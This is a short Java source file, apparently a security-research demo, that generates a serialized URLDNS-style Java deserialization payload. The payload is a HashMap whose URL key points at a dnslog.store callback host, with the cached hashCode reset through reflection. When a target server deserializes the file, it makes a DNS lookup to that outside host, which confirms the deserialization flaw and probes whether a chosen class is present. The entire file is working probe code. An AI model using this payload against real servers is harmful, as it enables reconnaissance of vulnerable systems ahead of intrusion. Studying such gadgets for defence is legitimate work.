package com.demo3;

import com.demo.common.MyObject;
import com.demo.common.TargetDetectClass;

import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.util.HashMap;

import static com.demo.common.Utils.Serialize;

public class TestUID {


    //对应的反序列化测试为 com.demo32.Test32.main
    public static void main(String[] args) throws Exception {

        String file = "demo3.ser";
        //使用makeClass需要避免显示引入 Foo.class导致重复加载
        //Class<?> targetClass = Utils.MakeClass("com.demo.common.TargetDetectClass");
        Class<?> targetClass = TargetDetectClass[].class;
//        Class<?> targetClass = java.lang.reflect.Proxy.newProxyInstance(TestUID.class.getClassLoader(),
//                TargetDetectClass.class);;


        HashMap<URL, Object> hashMap = new HashMap<>();
        URL url = new URL(null, "http://TargetDetectClass.d80b043e.dnslog.store", new SilentURLStreamHandler());

        hashMap.put( url,targetClass);

        Field f = java.net.URL.class.getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, -1);


        Serialize(hashMap, file);

       // deserialize(file);
    }

    static class SilentURLStreamHandler extends URLStreamHandler {
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }
        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}
